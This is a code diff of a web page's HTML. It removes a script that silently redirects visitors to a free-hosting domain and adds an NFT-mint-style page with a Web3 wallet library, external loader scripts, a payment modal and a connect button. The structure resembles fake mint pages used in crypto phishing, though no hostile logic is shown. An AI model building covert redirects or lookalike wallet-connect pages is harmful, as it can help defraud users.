@@ -1,20 +1,79 @@
 <!DOCTYPE html>
 <html lang="en">
 
+
 <head>
     <meta charset="UTF-8">
-    <title>ON</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loading...</title>
+    <link id="favicon" rel="icon" href="./assets/favicon.png">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Import .JS files -->
+    <script src="./settings.js"></script>
+    <script src="https://npmcdn.com/moralis/dist/moralis.js"></script>
+
+    <script type="text/javascript">
+        const vh = window.innerHeight * 0.01;
+        document.documentElement.style.setProperty('--vh', `${vh < 8.0 ? 8.0 : vh}px`);
+        window.addEventListener('resize', () => {
+            const vh = window.innerHeight * 0.01;
+            document.documentElement.style.setProperty('--vh', `${vh < 8.0 ? 8.0 : vh}px`);
+        });
+    </script>
+
+    <!-- Import CSS files -->
+    <link rel="stylesheet" type="text/css" href="./src/css/fonts.css" media="all">
+    <link rel="stylesheet" type="text/css" href="./src/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="./src/css/main.css">
 </head>
 
-<body>
+<body class="body">
+    <div class="content">
+        <video id="background-video" autoplay loop muted>
+            <source id="background-video-source" type="video/mp4">
+        </video>
 
-    <script>
-        
-        var url = 'https://cnkjs.000webhostapp.com/';
+        <div class="sub-head" id="claim-text-wrapper">
+            <div class="social_medias">
+                <a id="social_discord" href="https://discord.gg/" class="item discord social_media"
+                    target="_blank"><img src="./assets/svg/Discord_Icon.svg" draggable="false"
+                        alt="Discord Icon"></a>
+                <a id="social_twitter" href="https://twitter.com/" class="item twitter social_media"
+                    target="_blank"><img src="./assets/svg/Twitter_Icon.svg" draggable="false"
+                        alt="Twitter Icon"></a>
+            </div>
+            
+            <div id="payment-modal">
+                <div id="payment-header">
+                    <div id="payment-header-text">
+                        <h4 id="titleH4">Loading...</h4>
+                        <p id="totalSupply" class="pt-1.5 italic-grey"></p>
+                    </div>
+                </div>
+                <div id="payment-info">
+                    <img src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAQAAAAHUWYVAAABKUlEQVR42u3RMQEAAAjDMKYc6WCCgyOV0GS69KgAASIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAiIgQAQEiIAAERAgAgLEBCACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiACAkRAgAgIEAEBIiBAgAARECACAkRAgAgIEAERECACAkRAgAgIEAERECACAkSXLZ1yK0hKBJiuAAAAAElFTkSuQmCC"
+                        class="image" height="200px" id="price-img">
+                    <div id="payment-info-text">
+                        <p></p>
+                        <p class="title"><a id="nftPrice"></a> </p>
+                        <p id="dateString" class="launch-date"></p>
+                    </div>
+                </div>
 
-        
-        window.location.href = url;
-    </script>
+                <a href="https://www.facebook.com" target="_blank">
+                    <button class="purchase-button" id="connect">SOBRE</button>
+                </a>
+                <a href="https://www.facebook.com" target="_blank">
+                    <button class="purchase-button" id="connect">CONTATO</button>
+                </a>
+
+            </div>
+            <script src="./src/js/loader.js"></script>
+        </div>
+    </div>
 </body>
 
 </html>
